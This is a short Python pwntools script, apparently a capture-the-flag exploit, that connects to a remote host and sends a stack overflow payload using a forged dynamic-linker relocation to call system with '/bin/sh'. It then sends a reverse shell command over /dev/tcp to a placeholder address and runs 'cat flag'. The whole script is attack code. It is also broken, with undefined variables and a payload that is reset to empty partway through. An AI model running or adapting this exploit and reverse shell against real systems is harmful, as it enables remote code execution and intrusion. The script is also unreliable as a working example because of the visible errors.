from pwn import *

context.log_level='debug'

r=remote('202.120.7.202',6666)
plt_read=0x8048300
got_read=0x804a00c



payload=""
payload += 'A'*0x28 + 'b'*4 
payload += p32(plt_read)	
payload += p32(play)	
payload += p32(0)		
payload += p32(0x0804a030)	
payload += p32(74)	

payload += p32(0x0804a00a)+p32(0x0001e807)+p32(0)*5+p32(0x00001e34)+p32(0)*4+"system\0\0"+'\x00'*8+"/bin/bash\0"

payload = ''
payload += p32(got_start) + p32(r_info)
payload += p32(st_name) + p32(0)*5
payload += 'system\x00\x00'
payload += '/bin/sh\x00'  #bss + 0x4*10

payload += 'A'*0x28 + 'b'*4
payload += p32(0x080482F0) 
payload += p32(0x1d80)
payload += 'aaaa'
payload += p32(0x0804a070)
payload += 'aaaa'

payload+="bash -i >& /dev/tcp/yourip/yourport 1>&2"
payload+="\n"
payload+="cat flag\n"

r.send(payload)


r.interactive()